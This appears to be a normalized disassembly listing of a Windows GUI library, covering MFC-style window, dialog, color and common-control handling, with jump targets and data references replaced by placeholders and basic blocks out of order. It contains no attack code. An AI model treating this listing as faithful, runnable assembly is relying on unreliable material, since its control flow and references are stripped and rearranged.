mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_100153b4
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_100177d3
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_100153b4
push eax
push esi
call sub_100153b4
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_10017aa0
push [ ebp + 0xc ]
call sub_100177d3
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_100177d3
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_100153b4
jmp r-xdata
push esi
call sub_100153b4
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_100153b4
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_10015a27
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_100153b4
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_100153b4
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_100153b4
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_10017ae6
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_10013420
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_100166e2
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_10018322
mov ecx rw-data
call sub_100188b3
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_100169a3
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_100166b5
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_1001676e
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_10018322
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_100188b3
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_100169a3
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_100167e8
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_100153db
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_10003b95
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_1001682d
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_100153b4
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_100167e8
test eax eax
je r-xdata
sub_10016855
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10016855
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10016855
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_100153db
test eax eax
jne r-xdata
call sub_100153b4
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_100168ce
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_100153db
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_100151f3
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100168ce
sub_1001694b
push esi
mov esi ecx
call sub_10017464
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_1001744a
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_10016976
push esi
mov esi ecx
push sub_10018322
mov ecx rw-data
call sub_100188b3
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_100169a3
mov eax sub_10019ba0
call sub_10004904
sub esp 0x3c
push esi
push edi
push 0x0
call sub_10015342
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_10013420
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_10016976
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_10013420
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_10013420
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_10015054
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_10016976
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_10015a27
mov eax esi
jmp r-xdata
sub_10016a47
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10016aa2
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_10016aa2
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_10014bd5
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10016143
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_10016143
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_10014bd5
jmp r-xdata
sub_10016b8a
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_100169a3
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_1001531b
sub_10016bd9
push esi
mov esi ecx
call sub_10018d2c
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_1001744a
test eax 0x40000000
jne r-xdata
call sub_10013b81
test eax eax
je r-xdata
mov ecx rw-data
call sub_1001756d
mov ecx esi
call sub_1001531b
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_100168ce
call sub_10013b81
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_10018387
mov ecx rw-data
call sub_10018975
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_10016c56
push esi
push edi
mov edi ecx
call sub_10018d2c
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_10016d58
pop edi
pop esi
retn 0x8
push sub_10018387
mov ecx rw-data
call sub_10018975
mov esi eax
call sub_10013b81
test eax eax
je r-xdata
call sub_10013b81
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_10016ca9
push esi
mov esi ecx
call sub_10018d2c
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_1001744a
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_100152e6
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_100168ce
push [ esp + 0x8 ]
mov ecx eax
call sub_100176b4
sub_10016cf4
push ebx
push esi
push edi
mov ebx ecx
call sub_1001744a
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_1001531b
call sub_10003856
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_10016d58
push esi
mov esi ecx
call sub_10003856
cmp eax esi
jne r-xdata
mov ecx esi
call sub_1001744a
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_100175b1
mov ecx esi
call sub_1001531b
pop esi
retn 0x8
call sub_100152e6
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_100168ce
sub_10016da1
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_100169a3
test eax eax
je r-xdata
mov ecx esi
call sub_1001531b
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_10016dcb
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_1001531b
push 0x0
call sub_10016976
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_10016dec
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_1001531b
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_10016e36
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_10016976
test eax eax
je r-xdata
mov ecx esi
call sub_1001531b
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10016e5d
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_10017846
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_10016ed2
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_1001744a
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax __dos_header
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_10003a97
push eax
call sub_10003b02
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_10003856
test eax eax
je r-xdata
xor edi edi
test eax 0x20000000
je r-xdata
add ebx esi
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov esi [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x30 ]
mov edi [ ebp - 0x20 ]
add eax ecx
sub edi [ ebp - 0x28 ]
mov ebx [ ebp - 0x1c ]
cdq
sub eax edx
sub ebx [ ebp - 0x24 ]
mov ecx eax
mov eax edi
cdq
sub eax edx
mov edx [ ebp - 0x2c ]
sar ecx 0x1
sar eax 0x1
sub ecx eax
mov eax [ ebp - 0x34 ]
add eax edx
cdq
sub eax edx
mov esi eax
mov eax ebx
cdq
sub eax edx
sar esi 0x1
sar eax 0x1
sub esi eax
cmp ecx [ ebp - 0x18 ]
jge r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push 0x1
push eax
call sub_10003a97
push eax
call sub_10003b02
mov esi [ CopyRect@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call esi
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call esi
jmp r-xdata
mov eax [ eax + 0x1c ]
push 0x15
push 0xffffffff
push 0xffffffff
push esi
push ecx
mov ecx [ ebp - 0x8 ]
push 0x0
call sub_1001747e
pop edi
pop esi
pop ebx
leave
retn 0x4
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x1c ]
add esi [ ebp - 0xc ]
sub_1001708e
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_100170b2
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_10018d2c
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_10015ef0
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_100170f3
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_1001716a
push ebp
mov ebp esp
sub esp 0x34
call sub_10018d2c
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_10004940
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_10018d2c
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_10015ef0
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_10015ef0
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_10015ef0
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_100170b2
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_100170b2
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_100170f3
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_100170f3
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_100170f3
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_100170f3
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_100170f3
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_100170f3
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_100170f3
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_100170f3
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_100170f3
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_100170f3
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_100170f3
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_100170f3
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_100170f3
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_1001747e
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_10017530
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_10013420
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_1001756d
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_100175b1
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_10019428
call sub_100193f8
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_10017609
push ebp
